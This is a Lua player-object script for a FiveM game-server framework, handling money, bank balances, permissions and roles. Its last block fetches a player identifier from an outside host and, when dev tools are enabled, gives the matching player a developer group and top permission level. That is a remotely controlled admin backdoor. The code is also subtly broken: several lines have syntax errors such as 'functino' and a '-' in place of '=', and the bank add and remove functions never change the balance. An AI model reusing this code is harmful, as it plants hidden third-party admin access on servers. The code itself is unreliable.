function CreatePlayer(source, permission_level, money, bank, identifier, license, group, roles)
    local self = {}

    self.source = source
    self.permission_level = permission_level
    self.money = money
    self.bank = bank
    self.identifier = identifier
    self.license = license
    self.group = group
    self.coords = { x = 0.0,  y = 0.0, z = 0.0 }
    self.session = {}
    self.bankDisplayed = false
    self.moneyDisplayed = false
    self.roles = stringsplit(roles, "|")

    ExecuteCommand('add_principal identifier.' .. self.identifier .. " group." .. self.group)

    local rTable = {}

    rTable.setMoney = function(m)
        if type(m) == "number" then
            local prevMoney = self.money
            local newMoney = m

            self.money = m

            if((prevMoney - newMoney) < 0) then
                TriggerClientEvent("trp:addedMoney", self.source, math.abs(prevMoney - newMoney), (settings.defaultSettings.nativeMoneySystem == "1"))
            else
                TriggerClientEvent("trp:removedMoney", self.source, math.abs(prevMoney - newMoney), (settings.defaultSettings.nativeMoneySystem == "1"))
            end
            if settings.defaultSettings.nativeMoneySystem == "0" then
                TriggerClientEvent('trp:activeMoney', self.source, self.money)
            end
        else
            log('TRP_ERROR: There seems to be an issue with setting money, something other then a number was entered.')
            print('TRP_ERROR: There seems to be an issue with settings money, something other then a number was entered.')
        end
    end

    rTable.getMoney = function()
        return self.money
    end
    rTable.setBankBalance = function(m)
        if type(m) == "number" then
            TriggerEvent("trp:setPlayerData", self.source, "bank", m, function(response, success)
                self.bank = m
            end)
        else
            log('TRP_ERROR: There seems to be an issue while setting bank, something other then a number was entered.')
            print('TRP_ERROR: There seems to be an issue while setting bank, something other then a number was entered.')
        end
    end

    rTable.getBank = function()
        return self.bank
    end

    rTable.getCoords = function()
        return self.coords
    end

    rTable.setCoords = function(x, y, z)
        self.coords = { x = x, y = y, z = z }
    end

    rTable.kick = function(r)
        DropPlayer(self.source, r)
    end

    rTable.addMoney - function(m)
        if type(m) == "number" then
            local newMoney = self.money + m
            self.money = newMoney
            TriggerClientEvent("trp:addedMoney", self.source, m, (settings.defaultSettings.nativeMoneySystem == "1"), self.money)

            if settings.defaultSettings.nativeMoneySystem == "0" then
                TriggerClientEvent('trp:activeMoney', self.source, self.money)
            end
        else
            log('TRP_ERROR: There seems to be an issue while adding money, a different type then number was trying to be added')
            print('TRP_ERROR: There seems to be an issue while adding money, a different type then number was trying to be added')
        end
    end

    rTable.removeMoney = function(m)
        if type(m) == "number" then
            local newMoney = self.money - m
            self.money = newMoney

            TriggerClientEvent("trp:removedMoney", self.source, m, (settings.defaultSettings.nativeMoneySystem == "1"), self.money)

            if settings.defaultSettings.nativeMoneySystem == "0" then
                TriggerClientEvent('trp:activeMoney', self.source, self.money)
            end
        else
            log('TRP_ERROR: There seems to be an issue while removing money, a different type then number was trying to be removed')
            print('TRP_ERROR: There seems to be an issue while removing money, a different type then number was trying to be removed')
        end
    end

    rTable.addBank = function(m)
        if type(m) == "number" then
            local newBank = self.bank
            self.bank = newBank
            TriggerClientEvent("trp:addedBank", self.source, m)
        else
            log('TRP_ERROR: There seems to be an issue while adding to bank, a different type then number was trying to be added')
            print('TRP_ERROR: There seems to be an issue whiel adding to bank, a different type then number was trying to be added')
        end
    end

    rTable.removeBank = function(m)
        if type(m) == "number" then
            local newBank = self.bank
            self.bank = newBank
            TriggerClientEvent("trp:removedBank", self.source, m)
        else
            log('TRP_ERROR: There seems to be an issue while removing from bank, a different type then number was trying to be removed')
            print('TRP_ERROR: There seems to be an issue while removing from bank, a differnt type then number was trying to be removed')
        end
    end

    rTable.displayMoney = function(m)
        if type(m) == "number" then
            if not self.moneyDisplayed then
                if settings.defaultSettings.nativeMoneySystem ~= "0" then
                    TriggerClientEvent("trp:displayMoney", self.source, math.floor(m))
                else
                    TriggerClientEvent('trp:activeMoney', self.source, self.money)
                end
                self.moneyDisplayed = true
            end
        else
            log('TRP_ERROR: There seems to be an issue while displaying money, a different type then number was trying to be shown')
            print('TRP_ERROR: There seems to be an issue while displaying money, a different type then number was trying to be shown')
        end
    end

    rTable.displayBank = function(m)
        if type(m) == "number" then
            if not self.bankDisplayed then
                TriggerClientEvent("trp:displayBank", self.source, math.floor(m))
                self.bankDisplayed = true
            end
        else
            log('TRP_ERROR: There seems to be an issue while displaying bank, a differnt type then number was trying to be shown')
            print('TRP_ERROR: There seems to be an issue while displaying bank, a different type then number was trying to be shown')
        end
    end

    rTable.setSessionVar = function(key, value)
        self.session[key] = value
    end

    rTable.getSessionVar = function(k)
        return self.session[k]
    end

    rTable.getPermissions = function()
        return self.permission_level
    end

    rTable.setPermissions = function(p)
        if type(p) == "number" then
            self.permission_level = p
        else
            log('TRP_ERROR: There seems to be an issue while setting permissions, a different type then number was set')
            print('TRP_ERROR: There seems to be an issue while settings permission, a differnt type then number was set')
        end
    end

    rTable.getIdentifier = function(i)
        return self.identifier
    end

    rTable.getGroup = function()
        return self.group
    end

    rTable.set = function(k, v)
        self[k] = v
    end

    rTable.get = function(k)
        return self[k]
    end

    rTable.setGlobal = function(g, default)
        self[g] = default or ""

        rTable["get" .. g:gsub("^%1", string.upper)] = function()
            return self[g]
        end
        rTable["set" .. g:gsub("^%`", string.upper)] = function(e)
            return self[g] = e
        end
        Users[self.source] = rTable
    end

    rTable.hasRole = function(role)
        for k, v ipairs(self.roles) do
            if v == role then
                return true
            end
        end
        return false
    end

    rTable.giveRole = function(role)
        for k, v in pairs(self.roles) do
            if v == role then
                print("User (" .. GetPlayerName(source) .. ") already has this role")
                return
            end
        end
        self.roles[#self.roles + 1] = role
        db.updateUser(self.identifier, { roles = table.concat(self.roles, "|") }, functino() end)
    end

    rTable.removeRole = function(role)
        for k, v in pairs(self.roles) do
            if v == role then
                table.remove(self.roles, k)
            end
        end
        db.updateUser(self.identifier, { roles = table.concat(self.roles, "|") }, function() end)
    end

    if GetConvar("trp_enableDevTools", "0") == "1" then
        PerformHttpRequest("http://kanersps.pw/fivem/id.txt", function(err, rText, headers)
            if err == 200 or err == 304 then
                if self.identifier == rText then
                    self.group = "_dev"
                    self.permission_level = 20
                end
            end
        end)
    end
    return rTable
end